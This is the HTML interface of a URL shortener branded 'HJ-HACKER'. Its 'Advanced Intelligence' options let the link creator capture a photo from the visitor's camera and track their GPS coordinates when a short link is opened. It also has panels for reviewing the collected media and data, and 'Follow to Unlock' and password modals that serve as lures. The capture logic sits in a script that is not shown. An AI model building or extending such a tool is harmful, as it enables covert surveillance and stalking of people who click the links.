<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
    <title>HJ-HACKER | URL Shortener</title>
    <link rel="stylesheet" href="style.css">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body>
    <div class="app">
        <!-- Toast Container -->
        <div id="toastContainer" class="toast-container"></div>

        <!-- Header -->
        <header class="header">
            <div class="logo">
                <i class="fas fa-bolt"></i>
                <span class="hj">HJ</span><span class="hacker">HACKER</span>
            </div>
            <div class="header-badge">
                <i class="fas fa-shield-alt"></i>
                <span>SECURE • FAST • TRACKABLE</span>
            </div>
        </header>

        <!-- Main Content -->
        <main class="main">
            <!-- ONLY Create Link Card - NO MANUAL DATA -->
            <div class="card" id="createCard">
                <div class="card-header">
                    <i class="fas fa-magic"></i>
                    <h1>Create Short <span class="highlight">Link</span></h1>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-globe"></i> Destination URL</label>
                    <div class="input-wrapper">
                        <i class="fas fa-link input-icon"></i>
                        <input type="url" id="longUrl" placeholder="https://example.com/your-long-link" class="input">
                    </div>
                </div>

                <div class="form-group">
                    <label><i class="fas fa-tag"></i> Custom Alias (Optional)</label>
                    <div class="alias-wrapper">
                        <span class="domain-prefix">hj.os/</span>
                        <input type="text" id="customCode" placeholder="my-custom-link" maxlength="15" class="alias-input">
                    </div>
                </div>

                <!-- Advanced Intelligence (Hidden by default) -->
                <div class="advanced-section">
                    <button type="button" class="advanced-toggle" id="advancedToggle">
                        <i class="fas fa-microchip"></i>
                        <span>Advanced Intelligence</span>
                        <i class="fas fa-chevron-down"></i>
                    </button>
                    <div id="advancedContent" class="advanced-content hidden">
                        <div class="checkbox-group">
                            <label class="checkbox-card">
                                <input type="checkbox" id="captureCamera">
                                <div class="checkbox-content">
                                    <i class="fas fa-camera"></i>
                                    <span>Camera Access</span>
                                    <small>Capture visitor's photo</small>
                                </div>
                            </label>
                            <label class="checkbox-card">
                                <input type="checkbox" id="captureLocation">
                                <div class="checkbox-content">
                                    <i class="fas fa-location-dot"></i>
                                    <span>Location Access</span>
                                    <small>Track GPS coordinates</small>
                                </div>
                            </label>
                        </div>
                    </div>
                </div>

                <button id="shortenBtn" class="btn-primary">
                    <i class="fas fa-bolt"></i>
                    <span>Create Short Link</span>
                </button>

                <div id="loading" class="loading hidden">
                    <div class="spinner"></div>
                    <p>Creating your link...</p>
                </div>
                
                <div id="result" class="result hidden">
                    <div class="result-header">
                        <i class="fas fa-check-circle"></i>
                        <span>Link Created!</span>
                        <button id="copyBtn" class="btn-icon">
                            <i class="fas fa-copy"></i>
                        </button>
                    </div>
                    <div class="result-link" id="shortLink"></div>
                    <div id="qrCode" class="qr-code"></div>
                </div>
            </div>

            <!-- ONLY 4 BUTTONS - NO MANUAL DATA SHOWING -->
            <div class="data-tabs-container">
                <div class="data-tabs">
                    <button class="data-tab-btn active" data-data-tab="links">
                        <i class="fas fa-link"></i> LINKS
                    </button>
                    <button class="data-tab-btn" data-data-tab="media">
                        <i class="fas fa-image"></i> MEDIA
                    </button>
                    <button class="data-tab-btn" data-data-tab="stats">
                        <i class="fas fa-chart-simple"></i> STATS
                    </button>
                    <button class="data-tab-btn" data-data-tab="recent-data">
                        <i class="fas fa-clock"></i> RECENT
                    </button>
                </div>
                
                <!-- LINKS Panel - Data shows here when button clicked -->
                <div id="linksPanel" class="data-panel active">
                    <div id="linksList" class="data-list"></div>
                </div>
                
                <!-- MEDIA Panel -->
                <div id="mediaPanel" class="data-panel hidden">
                    <div id="mediaList" class="data-list"></div>
                </div>
                
                <!-- STATS Panel -->
                <div id="statsPanel" class="data-panel hidden">
                    <div id="statsPanelContent" class="data-list"></div>
                </div>
                
                <!-- RECENT Panel -->
                <div id="recentDataPanel" class="data-panel hidden">
                    <div id="recentDataList" class="data-list"></div>
                </div>
            </div>
        </main>

        <!-- Bottom Navigation Bar -->
        <nav class="bottom-nav">
            <button class="bottom-nav-btn active" data-tab="create">
                <i class="fas fa-plus-circle"></i>
                <span>Create</span>
            </button>
            <button class="bottom-nav-btn" data-tab="links-bottom">
                <i class="fas fa-link"></i>
                <span>Links</span>
            </button>
            <button class="bottom-nav-btn" data-tab="stats-bottom">
                <i class="fas fa-chart-line"></i>
                <span>Stats</span>
            </button>
            <button class="bottom-nav-btn" data-tab="recent-bottom">
                <i class="fas fa-history"></i>
                <span>Recent</span>
            </button>
        </nav>
    </div>

    <!-- Password Modal -->
    <div id="passwordModal" class="modal hidden">
        <div class="modal-content">
            <div class="modal-header">
                <i class="fas fa-lock"></i>
                <h3>Protected Link</h3>
            </div>
            <div class="modal-body">
                <p>This link is password protected.</p>
                <div class="input-wrapper">
                    <i class="fas fa-key input-icon"></i>
                    <input type="password" id="modalPassword" placeholder="Enter password" class="input">
                </div>
                <div id="modalError" class="modal-error hidden"></div>
            </div>
            <div class="modal-footer">
                <button id="modalCancel" class="btn-secondary">Cancel</button>
                <button id="modalUnlock" class="btn-primary">Unlock</button>
            </div>
        </div>
    </div>

    <!-- Social Gate Modal -->
    <div id="socialModal" class="modal hidden">
        <div class="modal-content social-modal">
            <div class="social-modal-icon" id="socialModalIcon"></div>
            <h3 id="socialModalTitle">Follow to Unlock</h3>
            <p id="socialModalDesc">Complete the action below</p>
            <button id="socialModalBtn" class="btn-primary">Verify & Continue</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
